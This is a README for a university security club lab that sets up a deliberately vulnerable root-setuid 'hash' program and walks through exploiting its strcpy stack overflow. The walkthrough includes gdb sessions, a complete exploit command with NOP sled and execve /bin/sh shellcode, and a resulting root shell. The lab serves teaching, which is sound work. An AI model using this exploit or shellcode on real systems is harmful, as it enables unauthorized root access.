# UAF CSC x86_64 Buffer Overflow Lab
The purpose of this lab is to exercise exploiting the root setuid of a program via a buffer overflow.

## Setup
This lab will require a 64bit Linux virtual machine with cmake and gdb installed, and [ASLR](https://www.networkworld.com/article/3331199/what-does-aslr-do-for-linux.html) disabled. This can be done by adding the file `(/etc/sysctl.d/01-disable-aslr.conf)` containing the following to `sysctl`:
```txt
kernel.randomize_va_space = 0
```

No particular distribution is required, though this has only been tested on Ubuntu and Arch with Intel CPUs.

Once the VMs are setup make 2 accounts. 

### Account 1
This first account will be an "Administrator" account with a long secure password **(do not use one of your own passwords)**, 
and sudo / root access. One of the goals of this lab is to compromise this account via a root shell spawned on the second account.

If youd' like to use this as a ctf-style lab you may also include a flag that will appear on the desktop when the user logs into the GUI, 
but for our purposes this will just serve the purpose of demonstrating that you have access to any account as root, 
and can even log into said accounts.

### Account 2
This second account will be a "Guest" account with no passwords, and no sudo / root access. 
This account shall have the main vulnerable [hash](main.c) binary installed with its setuid as root. 
It is highly recommended to also provide the inline shellcode string found in [shellcode.h](shellcode.h) in a hidden file.
You can build the vulnerable hash program and have it setup correct permissions by running the [build.sh](build.sh) script. 
Just be sure to remove all the other files included with the git repository (you should just be left with the hash program and the shellcode file - just move the files out of the directory and run `rm -r CSC-BufferOverflow-Lab/`).

## Writeup (Spoilers ahead!)

### Step 0: Information gatheringf

When looking for information that can be used to our advantage one if the first things to do will be to check out the hash program.
Running it without any arguments produces the following:
```txt
Usage: ./hash <string>
```
Ok, so it expects a string. Providing a text string `foo` changes the output to:
```txt
Hash: $6$/.VATz3thu0iHIDZ$9BsKgAl9DuiIQ51zXoFnVrOHU.0HbyHGuo1xcw9Szwja08fAqd8zBnGdWWrVT24D.n0Qd.LfV8BCI1aWvg8HV1
```
Neat! It hashes our string. Wonder if there's any limitations on the input?

Continuing to investigate the program if we run `ls -l hash` we learn the following:
```txt
-rwsr-xr-x 1 root root 23104 Nov  7 20:05 hash
```
Of note is the setuid bit, and the fact that it's owned by root.

If we run the `file` command on it we get the following:
```txt
hash: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=349b894fbc026b7b75dbe745f9ec698ca96daa6a, for GNU/Linux 4.4.0, with debug_info, not stripped
```

A few takeaways from this is that the program is a setuid 64-bit executable, that is **not stripped**.  
This means that when we pop it in a debugger with `gdb hash` we can view the programs source code!

### Step 1: Running (exploiting) with a debugger
In gdb we can view the source code with the `list` command which returns the following:
```c
(gdb) list
1	#include <stdio.h>
2	#include "hash.h"
3	
4	int main(int argc, char** argv) {
5	
6		if (argc != 2) {
7			printf("Usage: ./hash <string>\n");
8			return 1;
9		}
10	
(gdb)
11		char input[512];
12		strcpy(input, argv[1]);
13	
14		char* hash = crypt(input, makesalt('6'));
15		printf("Hash: %s\n", hash);
16	
17		return 0;
18	}
```
After the check to see if a string is provided, what is immediately clear is the size allotted for our input; 
It only allocates 512 bytes for our input, but never checks the length. 
If we *hypothetically* provided a string longer than 512 bytes we could possibly make the program execute arbitrary code!

### Step 2: Making our own return address

Luckily for us we dont have to actaully write a string that is 500+bytes long; we can get the terminal to do it for us.
If we execute provide `$(printf "\x41%.0s" {1..540})` as our string it'll translate to 540 "A"s (hex 41) - which results in the following:
```txt
(gdb) run $(printf "\x41%.0s" {1..540})
Starting program: hash $(printf "\x41%.0s" {1..540})
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Hash: (null)

Program received signal SIGSEGV, Segmentation fault.
0x00007f0041414141 in ?? ()
```
For our case ignore the threading information. Whats notable here is the address it segfaulted on - `0x00007f0041414141` looks like it was partially overwritten with our 41s.

This is our return address. 
If we increase the number of 41s we provide to 542 we could overwrite the entire thing, but it would be best if we could pickout an address on the stack to jump to.

We can take a look at our stack memory by entering the following:
```txt
(gdb) x /-140fx $rsp
0x7fffffffdbd0:	0xffffdf08	0x00007fff	0x00000000	0x00000002
0x7fffffffdbe0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdbf0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc10:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc40:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc50:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc60:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc70:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc80:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdc90:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdca0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdcb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdcc0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdcd0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdce0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdcf0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd10:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd40:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd50:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd60:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd70:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd80:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdd90:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdda0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffddb0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffddc0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffddd0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdde0:	0x41414141	0x41414141	0xf7fa40e0	0x00007fff
0x7fffffffddf0:	0x41414141	0x41414141	0x41414141	0x00007f00
```

Look at all those 41s. Lets pick out an address towards the top - memory shifts around slightly, so the larger the buffer the better.
Well use `0x7fffffffdc80` for this example.

Going back to our string we have to input our address in backwards as intel is [little endian](https://en.wikipedia.org/wiki/Endianness#Hardware).
So the resulting code should fill the stack with 41s and then point back into it:
```txt
(gdb) run $(printf "\x41%.0s" {1..536}; printf "\x80\xdc\xff\xff\xff\x7f")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: hash $(printf "\x41%.0s" {1..536}; printf "\x80\xdc\xff\xff\xff\x7f")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hash: *0

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffdc80 in ?? ()
```
Hey! That looks like our address! 
If we examine what's at our return address which is causing it to segfault it will reveal that it's trying to run `0x41414141`
```txt
(gdb) x 0x00007fffffffdc80
0x7fffffffdc80:	0x41414141
```

### Step 3: Spawning a shell
So we control where the stack returns to... Why not have it execute code that spawns a shell rather than just a bunch of 41s?
To speed things up there is shellcode provided with the lab. 
Because our shellcode puts its own variables on the stack we need to give it some buffer, otherwise it will overwrite its own tail.

```txt
(gdb) run $(printf "\x90%.0s" {1..480}; printf "\x48\x31\xff\x6a\x69\x58\x0f\x05\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x0f\x05"; printf "\x41%.0s" {1..22}; printf "\x80\xdc\xff\xff\xff\x7f")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: hash $(printf "\x90%.0s" {1..480}; printf "\x48\x31\xff\x6a\x69\x58\x0f\x05\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x0f\x05"; printf "\x41%.0s" {1..22}; printf "\x80\xdc\xff\xff\xff\x7f")
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hash: *0
process 2348 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ 
```

So our shell works - Excelent, although this was done in a debugger. The real test is if we're able to get it working outside the debugger.
Exiting twice (once for the shell and the final for gdb) and returning to our shell we can now try running the program with our crafted input.

Memory addresses may be slightly different outside the debugger, but that's why we allowed for such a large noop sled.
We can catch more addresses with a larger net so to say.

```txt
./hash $(printf "\x90%.0s" {1..480}; printf "\x48\x31\xff\x6a\x69\x58\x0f\x05\x6a\x3b\x58\x48\x31\xf6\x48\x31\xd2\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x0f\x05"; printf "\x41%.0s" {1..22}; printf "\x80\xdc\xff\xff\xff\x7f")
Hash: *0
# 
```

Once the program has been run and a shell has been spawned go ahead and check who you are running the shell as via
`whoami`

```txt
# whoami
root
# 
```

Thus concludes the writeup.
